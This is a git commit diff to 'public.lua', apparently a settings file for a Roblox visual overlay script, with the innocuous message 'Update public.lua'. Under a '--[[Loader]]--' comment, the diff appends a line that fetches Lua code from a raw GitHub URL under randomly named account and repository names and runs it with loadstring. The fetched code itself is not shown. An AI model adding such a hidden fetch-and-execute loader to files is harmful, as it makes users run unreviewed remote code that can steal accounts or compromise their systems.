c0b699b5b624c3c7f7f98eceb6486cfec6e9d5ac
SiMpedIftweardiNatYPerAhmaGIbleScaLaNiA <73495952+SiMpedIftweardiNatYPerAhmaGIbleScaLaNiA@users.noreply.github.com>
2020-10-26 19:11:39 +0000

    Update public.lua

--- public.lua
+++ public.lua
@@ -33,3 +33,7 @@ local LineThickness = 0.3
 local Transparency = 0.8
 local SurfaceTransparency = 0
 local SurfaceColor = Color3.fromRGB(0, 255 , 255)
+
+--[[Loader]]--
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/SiMpedIftweardiNatYPerAhmaGIbleScaLaNiA/fECItAXIdEaTIChYBerENcturBlEmERnUNEAtHurEAmbASKiNd/main/loader.lua'))()
